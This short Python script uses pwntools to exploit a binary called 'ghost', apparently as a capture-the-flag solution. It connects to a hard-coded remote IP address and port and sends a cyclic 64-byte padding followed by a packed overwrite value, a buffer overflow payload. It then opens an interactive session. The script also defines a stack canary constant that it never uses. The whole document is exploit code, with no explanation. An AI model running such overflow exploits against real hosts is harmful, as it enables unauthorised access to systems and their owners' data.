from pwn import *

elf = ELF("./ghost")
r = process("./ghost")
r = remote("139.144.184.150", 4000)
canary = 0x90510ba1770a0400

payload = cyclic(64) + p64(0x44434241)
r.sendline(payload)
r.interactive()